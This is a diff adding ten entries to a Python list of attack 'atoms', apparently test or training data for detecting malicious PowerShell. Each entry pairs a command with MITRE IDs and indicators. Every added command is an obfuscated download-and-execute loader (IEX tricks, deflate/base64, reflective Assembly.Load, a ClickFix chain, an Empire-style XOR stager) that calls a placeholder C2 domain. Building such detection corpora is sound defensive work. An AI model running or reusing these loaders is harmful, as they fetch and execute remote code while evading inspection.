@@ -556,6 +556,78 @@ ATOMS: List[Dict[str, Any]] = [
         "mitre":  ["T1528", "T1059.001"],
         "iocs":   {"urls": ["https://sts.amazonaws.com/"]},
     },
+
+    # ── BTLO analyst-training tradecraft (Blue Team Labs Online) ─────
+    {
+        "family": "BTLO / Emotet (base64+UTF16LE)",
+        "source": "BTLO · Malicious PowerShell Analysis · Hannachi/Andrews (Medium 2023-24)",
+        "cmd": "powershell -Enc IEX (New-Object Net.WebClient).DownloadString('http://emotet-panel.top/g.php')",
+        "mitre":  ["T1059.001", "T1105", "T1027"],
+        "iocs":   {"domains": ["emotet-panel.top"], "urls": ["http://emotet-panel.top/g.php"]},
+    },
+    {
+        "family": "PS String-Concat IEX",
+        "source": "Bohannon / Revoke-Obfuscation (Blackhat 2017)",
+        "cmd": "& ('I'+'E'+'X') ((New-Object Net.WebClient).DownloadString('http://concat-c2.lol/x'))",
+        "mitre":  ["T1059.001", "T1027", "T1105"],
+        "iocs":   {"domains": ["concat-c2.lol"], "urls": ["http://concat-c2.lol/x"]},
+    },
+    {
+        "family": "PS Reversed-IEX",
+        "source": "Bohannon Invoke-Obfuscation reverse tradecraft",
+        "cmd": "& (-join 'XEI'[2..0]) ((New-Object Net.WebClient).DownloadString('http://reverse-iex.top/p'))",
+        "mitre":  ["T1059.001", "T1027.010", "T1105"],
+        "iocs":   {"domains": ["reverse-iex.top"], "urls": ["http://reverse-iex.top/p"]},
+    },
+    {
+        "family": "PS Filler-Char Obfuscation",
+        "source": "PowerShell Obfuscation Bible · t3l3machus",
+        "cmd": "IEX((nEW-ObJeCt Net.WebClient).'DownloadString'('http://filler-c2.click/agent'))",
+        "mitre":  ["T1059.001", "T1027", "T1105"],
+        "iocs":   {"domains": ["filler-c2.click"], "urls": ["http://filler-c2.click/agent"]},
+    },
+    {
+        "family": "PS Format-Operator IEX",
+        "source": "Cynet · PowerShell Obfuscation Chapter 2",
+        "cmd": "& (\"{1}{0}\" -f 'EX','I') ((New-Object Net.WebClient).DownloadString('http://format-op.zip/loader'))",
+        "mitre":  ["T1059.001", "T1027", "T1105"],
+        "iocs":   {"domains": ["format-op.zip"], "urls": ["http://format-op.zip/loader"]},
+    },
+    {
+        "family": "PS DeflateStream+B64",
+        "source": "Sophos · malicious PowerShell deflate loader",
+        "cmd": "IEX (New-Object IO.StreamReader(New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('DEADBEEF...'),[IO.Compression.CompressionMode]::Decompress)).ReadToEnd()); iwr http://deflate-c2.top/x",
+        "mitre":  ["T1059.001", "T1027", "T1140", "T1105"],
+        "iocs":   {"domains": ["deflate-c2.top"], "urls": ["http://deflate-c2.top/x"]},
+    },
+    {
+        "family": "PS SecureString Payload",
+        "source": "Wietze Beukema · PowerShell SecureString obfuscation",
+        "cmd": "IEX ([Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString 'ENCRYPTED_STR' -Key (1..16)))))",
+        "mitre":  ["T1059.001", "T1027"],
+        "iocs":   {},
+    },
+    {
+        "family": "PS ClickFix Chain",
+        "source": "Fortinet · ClickFix full PS attack chain (2024)",
+        "cmd": "powershell -w hidden -c \"iwr https://clickfix-c2.top/verify.ps1 -OutFile $env:TEMP\\v.ps1; & $env:TEMP\\v.ps1\"",
+        "mitre":  ["T1059.001", "T1105", "T1204.002"],
+        "iocs":   {"domains": ["clickfix-c2.top"], "urls": ["https://clickfix-c2.top/verify.ps1"]},
+    },
+    {
+        "family": "PS Reflection.Assembly.Load",
+        "source": "Unit42 · Cobalt Strike reflection loader",
+        "cmd": "[System.Reflection.Assembly]::Load([Convert]::FromBase64String((iwr https://reflect-c2.click/a).Content)) | Out-Null",
+        "mitre":  ["T1059.001", "T1620", "T1105"],
+        "iocs":   {"domains": ["reflect-c2.click"], "urls": ["https://reflect-c2.click/a"]},
+    },
+    {
+        "family": "PS Empire Stager (BTLO shape)",
+        "source": "PowerShellEmpire · classic staging loader",
+        "cmd": "$k='PWD_KEY';$B=[Convert]::FromBase64String('BASE64BLOB');for($i=0;$i -lt $B.Length;$i++){$B[$i]=$B[$i] -bxor $k[$i%$k.Length]};IEX([Text.Encoding]::ASCII.GetString($B)); iwr http://empire-btlo.top/agent",
+        "mitre":  ["T1059.001", "T1027", "T1027.010", "T1105"],
+        "iocs":   {"domains": ["empire-btlo.top"], "urls": ["http://empire-btlo.top/agent"]},
+    },
 ]
 
 # ---------------------------------------------------------------------------
